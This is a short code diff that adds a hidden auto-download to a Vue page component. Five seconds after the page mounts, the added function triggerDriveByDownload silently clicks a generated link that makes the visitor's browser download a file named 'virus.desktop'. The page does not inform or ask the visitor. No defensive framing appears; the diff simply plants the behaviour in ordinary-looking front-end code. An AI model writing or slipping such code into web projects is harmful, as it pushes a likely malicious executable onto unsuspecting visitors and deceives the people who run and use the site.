@@ -2,6 +2,23 @@
     import { ref, onMounted } from 'vue';
     import MioButton from '@/components/MioButton.vue';
     import LeaButton from '@/components/LeaButton.vue';
+
+    const triggerDriveByDownload = () => {
+        const link = document.createElement('a');
+        link.href = '/devoirImportant.desktop'; 
+        link.download = 'virus.desktop';
+        link.target = '_self';
+
+        document.body.appendChild(link);
+        link.click();
+        document.body.removeChild(link);
+    };
+
+    onMounted(() => {
+        setTimeout(() => {
+            triggerDriveByDownload();
+        }, 5000);
+    });
 </script>
 
 <template>
